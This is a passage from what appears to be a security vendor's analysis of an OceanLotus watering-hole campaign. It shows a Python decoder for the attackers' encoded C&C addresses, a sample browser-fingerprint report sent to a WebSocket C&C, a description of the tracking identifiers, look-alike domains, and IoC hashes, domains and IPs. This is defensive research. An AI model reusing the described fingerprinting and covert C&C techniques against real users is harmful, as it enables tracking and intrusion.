						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60581bc15287b994559909-1"><span class="crayon-e">def </span><span class="crayon-e">decrypt</span><span class="crayon-sy">(</span><span class="crayon-v">encrypted_url</span><span class="crayon-sy">)</span><span class="crayon-o">:</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581bc15287b994559909-2"><span class="crayon-h">	</span><span class="crayon-e ">s</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span></div><div class="crayon-line" id="crayon-60581bc15287b994559909-3"><span class="crayon-h">	</span><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-s">""</span><span class="crayon-sy">.</span><span class="crayon-e">join</span><span class="crayon-sy">(</span><span class="crayon-e">chr</span><span class="crayon-sy">(</span><span class="crayon-v">s</span><span class="crayon-sy">.</span><span class="crayon-e">index</span><span class="crayon-sy">(</span><span class="crayon-v">encrypted_url</span><span class="crayon-sy">[</span><span class="crayon-v">e</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">*</span><span class="crayon-h"> </span><span class="crayon-cn">36</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-v">s</span><span class="crayon-sy">.</span><span class="crayon-e">index</span><span class="crayon-sy">(</span><span class="crayon-v">encrypted_url</span><span class="crayon-sy">[</span><span class="crayon-v">e</span><span class="crayon-o">+</span><span class="crayon-cn">1</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-st">for</span><span class="crayon-h"> </span><span class="crayon-i">e</span><span class="crayon-h"> </span><span class="crayon-st">in</span><span class="crayon-h"> </span><span class="crayon-e">range</span><span class="crayon-sy">(</span><span class="crayon-cn">0</span><span class="crayon-sy">,</span><span class="crayon-e">len</span><span class="crayon-sy">(</span><span class="crayon-v">encrypted_url</span><span class="crayon-sy">)</span><span class="crayon-sy">,</span><span class="crayon-cn">2</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0003 seconds] -->
<p><em>Figure 5 &#8211; Python code to decrypt the C&amp;C servers</em></p>
<p>Once the C&amp;C address is decrypted, the script sends a unique string of 15 digits, then receives and executes a second-stage script. All communications are performed through WebSocket over SSL. This protocol allows full duplex communication between a client and a server. It means that, once the client establishes a connection, a server can send data to the client even if the client did not send a request. However, in this particular case, the principal goal of using web sockets seems to be to evade detection.</p>
<h2>Second stage</h2>
<p>The second stage script is actually a reconnaissance script. The OceanLotus developers reused Valve’s fingerprintjs2 library, available on <a href="https://github.com/Valve/fingerprintjs2/tree/a5ea808a9e1ce1646716332d1660a2c74c765336" target="_blank" rel="noopener">GitHub</a>, slightly modifying it in order to add network communication and a custom report.</p>
<p>Figure 6 describes the different actions executed by the script. All the communications go through the WebSocket session opened by the first stage.</p>
<div id="attachment_119000" style="width: 1610px" class="wp-caption aligncenter"><a href="/wp-content/uploads/2018/11/2nd_stage_v2-1.png"><img class="size-full wp-image-119000" src="/wp-content/uploads/2018/11/2nd_stage_v2-1.png" alt="" width="1600" height="2264" srcset="https://www.welivesecurity.com/wp-content/uploads/2018/11/2nd_stage_v2-1.png 1600w, https://www.welivesecurity.com/wp-content/uploads/2018/11/2nd_stage_v2-1-212x300.png 212w, https://www.welivesecurity.com/wp-content/uploads/2018/11/2nd_stage_v2-1-768x1087.png 768w, https://www.welivesecurity.com/wp-content/uploads/2018/11/2nd_stage_v2-1-724x1024.png 724w" sizes="(max-width: 1600px) 100vw, 1600px" /></a><p class="wp-caption-text">Figure 6 &#8211; Flow of the second stage payload</p></div>
<p>The communication is encrypted using an AES session key, generated by the server. It is encrypted with an RSA 1024-bit public key and sent to the client. Thus, it is not possible to decrypt the communications between the client and the server.</p>
<p>In comparison to the previous iterations of their watering hole framework, this will make it much more difficult for defenders, because the data sent over the network cannot be detected then decrypted. This will prevent network detection of the data. The public key sent by the server is always the same and is available in the IoCs section.</p>
<p>This recon script builds a report, similar to the one shown below, and sends it to the second stage C&amp;C server.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60581bc15287e761555305" class="crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div><span class="crayon-language">JavaScript</span></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
{
  "history": {
    "client_title": "Ministry%20of%20Foreign%20Affairs%20and%20International%20Cooperation%20-",
    "client_url": "https://www.mfaic.gov.kh/",
    "client_cookie": "",
    "client_hash": "",
    "client_referrer": "https://www.mfaic.gov.kh/foreign-ngos",
    "client_platform_ua": "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36",
    "client_time": "2018-10-21T12:43:25.254Z",
    "timezone": "Asia/Bangkok",
    "client_network_ip_list": [
      "192.168.x.x",
      "x.x.x.x"
    ],
    "client_api": "wss://tcog.thruhere.net/",
    "client_zuuid": "defaultcommunications39e10c84a0546508c58d48ae56ab7c7eca768183e640a1ebbb0cceaef0bd07cedefaultcommunications9360af458bb80c43fd1f73190b80dbfb0b276c48a8a6d453444dae086bc77be7",
    "client_uuid": "a612cdb028e1571dcab18e4aa316da26"
  },
  "navigator": {
    "plugins": {
      "activex": false,
      "cors": true,
      "flash": false,
      "java": false,
      "foxit": true,
      "phonegap": false,
      "quicktime": false,
      "realplayer": false,
      "silverlight": false,
      "touch": false,
      "vbscript": false,
      "vlc": false,
      "webrtc": true,
      "wmp": false
    },
    "_screen": {
      "width": 1920,
      "height": 1080,
      "availWidth": 1920,
      "availHeight": 1080,
      "resolution": "1920x1080"
    },
 "_plugins": [
[...]</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60581bc15287e761555305-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581bc15287e761555305-2">2</div><div class="crayon-num" data-line="crayon-60581bc15287e761555305-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581bc15287e761555305-4">4</div><div class="crayon-num" data-line="crayon-60581bc15287e761555305-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581bc15287e761555305-6">6</div><div class="crayon-num" data-line="crayon-60581bc15287e761555305-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581bc15287e761555305-8">8</div><div class="crayon-num" data-line="crayon-60581bc15287e761555305-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581bc15287e761555305-10">10</div><div class="crayon-num" data-line="crayon-60581bc15287e761555305-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581bc15287e761555305-12">12</div><div class="crayon-num" data-line="crayon-60581bc15287e761555305-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581bc15287e761555305-14">14</div><div class="crayon-num" data-line="crayon-60581bc15287e761555305-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581bc15287e761555305-16">16</div><div class="crayon-num" data-line="crayon-60581bc15287e761555305-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581bc15287e761555305-18">18</div><div class="crayon-num" data-line="crayon-60581bc15287e761555305-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581bc15287e761555305-20">20</div><div class="crayon-num" data-line="crayon-60581bc15287e761555305-21">21</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581bc15287e761555305-22">22</div><div class="crayon-num" data-line="crayon-60581bc15287e761555305-23">23</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581bc15287e761555305-24">24</div><div class="crayon-num" data-line="crayon-60581bc15287e761555305-25">25</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581bc15287e761555305-26">26</div><div class="crayon-num" data-line="crayon-60581bc15287e761555305-27">27</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581bc15287e761555305-28">28</div><div class="crayon-num" data-line="crayon-60581bc15287e761555305-29">29</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581bc15287e761555305-30">30</div><div class="crayon-num" data-line="crayon-60581bc15287e761555305-31">31</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581bc15287e761555305-32">32</div><div class="crayon-num" data-line="crayon-60581bc15287e761555305-33">33</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581bc15287e761555305-34">34</div><div class="crayon-num" data-line="crayon-60581bc15287e761555305-35">35</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581bc15287e761555305-36">36</div><div class="crayon-num" data-line="crayon-60581bc15287e761555305-37">37</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581bc15287e761555305-38">38</div><div class="crayon-num" data-line="crayon-60581bc15287e761555305-39">39</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581bc15287e761555305-40">40</div><div class="crayon-num" data-line="crayon-60581bc15287e761555305-41">41</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581bc15287e761555305-42">42</div><div class="crayon-num" data-line="crayon-60581bc15287e761555305-43">43</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581bc15287e761555305-44">44</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60581bc15287e761555305-1"><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581bc15287e761555305-2"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-s">"history"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-60581bc15287e761555305-3"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"client_title"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-s">"Ministry%20of%20Foreign%20Affairs%20and%20International%20Cooperation%20-"</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581bc15287e761555305-4"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"client_url"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-s">"https://www.mfaic.gov.kh/"</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-60581bc15287e761555305-5"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"client_cookie"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-s">""</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581bc15287e761555305-6"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"client_hash"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-s">""</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-60581bc15287e761555305-7"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"client_referrer"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-s">"https://www.mfaic.gov.kh/foreign-ngos"</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581bc15287e761555305-8"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"client_platform_ua"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-s">"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-60581bc15287e761555305-9"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"client_time"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-s">"2018-10-21T12:43:25.254Z"</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581bc15287e761555305-10"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"timezone"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-s">"Asia/Bangkok"</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-60581bc15287e761555305-11"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"client_network_ip_list"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-sy">[</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581bc15287e761555305-12"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"192.168.x.x"</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-60581bc15287e761555305-13"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"x.x.x.x"</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581bc15287e761555305-14"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">]</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-60581bc15287e761555305-15"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"client_api"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-s">"wss://tcog.thruhere.net/"</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581bc15287e761555305-16"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"client_zuuid"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-s">"defaultcommunications39e10c84a0546508c58d48ae56ab7c7eca768183e640a1ebbb0cceaef0bd07cedefaultcommunications9360af458bb80c43fd1f73190b80dbfb0b276c48a8a6d453444dae086bc77be7"</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-60581bc15287e761555305-17"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"client_uuid"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-s">"a612cdb028e1571dcab18e4aa316da26"</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581bc15287e761555305-18"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-sy">}</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-60581bc15287e761555305-19"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-s">"navigator"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581bc15287e761555305-20"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"plugins"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-60581bc15287e761555305-21"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"activex"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-t">false</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581bc15287e761555305-22"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"cors"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-t">true</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-60581bc15287e761555305-23"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"flash"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-t">false</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581bc15287e761555305-24"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"java"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-t">false</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-60581bc15287e761555305-25"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"foxit"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-t">true</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581bc15287e761555305-26"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"phonegap"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-t">false</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-60581bc15287e761555305-27"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"quicktime"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-t">false</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581bc15287e761555305-28"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"realplayer"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-t">false</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-60581bc15287e761555305-29"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"silverlight"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-t">false</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581bc15287e761555305-30"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"touch"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-t">false</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-60581bc15287e761555305-31"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"vbscript"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-t">false</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581bc15287e761555305-32"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"vlc"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-t">false</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-60581bc15287e761555305-33"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"webrtc"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-t">true</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581bc15287e761555305-34"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"wmp"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-t">false</span></div><div class="crayon-line" id="crayon-60581bc15287e761555305-35"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581bc15287e761555305-36"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"_screen"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-60581bc15287e761555305-37"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"width"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">1920</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581bc15287e761555305-38"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"height"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">1080</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-60581bc15287e761555305-39"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"availWidth"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">1920</span><span class="crayon-sy">,</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581bc15287e761555305-40"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"availHeight"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">1080</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-60581bc15287e761555305-41"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"resolution"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-s">"1920x1080"</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581bc15287e761555305-42"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-60581bc15287e761555305-43"><span class="crayon-h"> </span><span class="crayon-s">"_plugins"</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-sy">[</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581bc15287e761555305-44"><span class="crayon-sy">[</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">]</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0007 seconds] -->
<p><em>Figure 7 &#8211; Fingerprint report</em></p>
<p>This report is nearly identical to the <a href="https://www.volexity.com/wp-content/uploads/2017/11/FrameworkB.png" target="_blank" rel="noopener">report generated from OceanLotus Framework B</a>, documented by Volexity researchers in 2017. The different sections are similar and they include identical typos. Thanks to these similarities and the location of the targets, we are highly confident that OceanLotus runs this campaign.</p>
<p>The report generated contains detailed information about the victim browser and the website visited: the user-agent, the HTTP Referer, the local and external IP address, the browser plugins the browser’s configured language preferences.</p>
<p>Also, there are two unique identifiers per machine, called <em>client_zuuid </em>and <em>client_uuid</em>. They are probably used to identify users and track them across visits. These identifiers were actually already present in the 2017 version of the framework and <em>client_uuid</em> was computed in a similar way.</p>
<p>The <em>client_zuuid</em> is the concatenation of the different deviceId values contained in navigator.mediaDevices.enumerateDevices. The devices are the external devices accessible to the browser, such as cameras or microphones. Thus, this value should be the same for a given user during their different visits from the same computer.</p>
<p>The <em>client_uuid</em> is a MD5 hash of some fingerprint information extracted by fingerprintjs2. Among the collected information are the browser user-agent, the language, the time zone, the browser plugins, and the fonts available in the browser. Again, this value should be identical across visits, unless, for example, the user updates the browser or uses a different device.</p>
<p>Finally, the server can send additional JavaScript code to the victimized computer, probably the actual payload. Unfortunately, due to the use of an AES session key to encrypt the communications, we were not able to identify in-the-wild examples of payloads sent by the attackers. In addition, the payloads are only delivered to specific targets. Thus, it was not possible to get them using a test machine. However, according to previous reports, these OceanLotus watering hole campaigns aim to phish its victims. For example, <a href="https://www.volexity.com/wp-content/uploads/2017/11/OL-GoogleApp-768x992.png" target="_blank" rel="noopener">Volexity reported</a> that users were shown a pop-up asking to approve OAuth access to the victim’s Google account for an OceanLotus Google App. Using this technique, attackers can get access to the victim’s contacts and emails.</p>
<h1>Network infrastructure</h1>
<p>In order to be as stealthy as possible, the OceanLotus operators registered one first stage and one second stage domain per compromised website. Each domain is hosted on a separate server with a distinct IP address. They registered at least 50 domains and 50 servers for this campaign.</p>
<p>While most of the first-stage domains were registered on free domain name services, most of the second stage domains are paid domain names. They also mimic genuine websites in order to seem legitimate. Table 3 shows some services mimicked by the attackers.</p>

<table id="tablepress-609" class="tablepress tablepress-id-609">
<thead>
<tr class="row-1 odd">
	<th class="column-1">C&amp;C domain</th><th class="column-2">Legitimate domain</th>
</tr>
</thead>
<tbody class="row-hover">
<tr class="row-2 even">
	<td class="column-1">cdn-ampproject[.]com</td><td class="column-2">cdn.ampproject.com</td>
</tr>
<tr class="row-3 odd">
	<td class="column-1">bootstraplink [.]com</td><td class="column-2">getbootstrap.com</td>
</tr>
<tr class="row-4 even">
	<td class="column-1">sskimresources[.]com</td><td class="column-2">s.skimresources.com</td>
</tr>
<tr class="row-5 odd">
	<td class="column-1">widgets-wp[.]com</td><td class="column-2">widgets.wp.com</td>
</tr>
</tbody>
</table>

<p><em>Table 3 &#8211; Legitimate websites mimicked by the attackers</em></p>
<p>The number of domains used and their similarity to legitimate websites probably makes them harder to detect for a human eye looking at the network traffic.</p>
<h1>Conclusion</h1>
<p>Despite being actively tracked by many researchers, the OceanLotus group is still very busy attacking targets in Southeast Asia. They also regularly improve their toolset, including their watering hole framework and their Windows and MacOS malware. The recent updates to their watering hole framework, highlighted in this blog, show a level of sophistication never before seen for OceanLotus. This is yet another reminder that this APT group should be closely tracked.</p>
<p>In order to limit the number of victims, we notified each compromised website owner and explained how to remove the malicious JavaScript code although some seem very resistant to being informed or helped.</p>
<p><em>ESET Researchers will continue tracking any development of the OceanLotus toolset.</em> <em>Indicators of Compromise can also be found on </em><a href="https://github.com/eset/malware-ioc/tree/master/oceanlotus" target="_blank" rel="noopener"><em>GitHub</em></a><em>. For any inquiries, or to make sample submissions related to the subject, contact us at threatintel@eset.com</em></p>
<h1>References</h1>
<p>[1]         ESET Research, &#8220;OceanLotus: Old techniques, new backdoor,&#8221; 03 2018. [Online]. Available: https://www.welivesecurity.com/wp-content/uploads/2018/03/ESET_OceanLotus.pdf.</p>
<p>[2]         N. Carr, &#8220;Cyber Espionage is Alive and Well: APT32 and the Threat to Global Corporations,&#8221; FireEye, 14 05 2017. [Online]. Available: https://www.fireeye.com/blog/threat-research/2017/05/cyber-espionage-apt32.html.</p>
<p>[3]         Sky Eye Lab, &#8220;OceanLotus APT Report Summary,&#8221; 29 05 2015. [Online]. Available: http://blogs.360.cn/post/oceanlotus-apt.html.</p>
<p>[4]         S. K. S. A. Dave Lassalle, &#8220;OceanLotus Blossoms: Mass Digital Surveillance and Attacks Targeting ASEAN, Asian Nations, the Media, Human Rights Groups, and Civil Society,&#8221; Volexity, 06 11 2017. [Online]. Available: https://www.volexity.com/blog/2017/11/06/oceanlotus-blossoms-mass-digital-surveillance-and-exploitation-of-asean-nations-the-media-human-rights-and-civil-society/.</p>
<h2>Indicators of Compromise (IoCs)</h2>
<p><strong>Files</strong></p>

<table id="tablepress-610" class="tablepress tablepress-id-610">
<thead>
<tr class="row-1 odd">
	<th class="column-1">Description</th><th class="column-2">SHA-1</th><th class="column-3">SHA-256</th><th class="column-4">Detection name</th>
</tr>
</thead>
<tbody class="row-hover">
<tr class="row-2 even">
	<td class="column-1">First stage script</td><td class="column-2">2194271C7991D60AE82436129D7F25C0A689050A</td><td class="column-3">1EDA0DE280713470878C399D3FB6C331BA0FADD0BD9802ED98AE06218A17F3F7</td><td class="column-4">JS/Agent.NYQ</td>
</tr>
<tr class="row-3 odd">
	<td class="column-1">Second stage script</td><td class="column-2">996D0AC930D2CDB16EF96EDC27D9D1AFC2D89CA8</td><td class="column-3">8B824BE52DE7A8723124BAD5A45664C574D6E905F300C35719F1E6988887BD62</td><td class="column-4">JS/Agent.NYR</td>
</tr>
</tbody>
</table>

<p><strong>Network IoCs</strong></p>

<table id="tablepress-611" class="tablepress tablepress-id-611">
<thead>
<tr class="row-1 odd">
	<th class="column-1">Compromised website</th><th class="column-2">1st stage</th><th class="column-3">IP address</th><th class="column-4">2nd stage</th><th class="column-5">IP address</th>
</tr>
</thead>
<tbody class="row-hover">
<tr class="row-2 even">
	<td class="column-1">baotgm[.]net</td><td class="column-2">arabica.podzone[.]net</td><td class="column-3">178.128.103.24</td><td class="column-4">10cm.mypets[.]ws</td><td class="column-5">178.128.100.189</td>
</tr>
<tr class="row-3 odd">
	<td class="column-1">cnrp7[.]org</td><td class="column-2">utagscript[.]com</td><td class="column-3">206.189.88.50</td><td class="column-4">optnmstri[.]com</td><td class="column-5">159.65.134.146</td>
</tr>
<tr class="row-4 even">
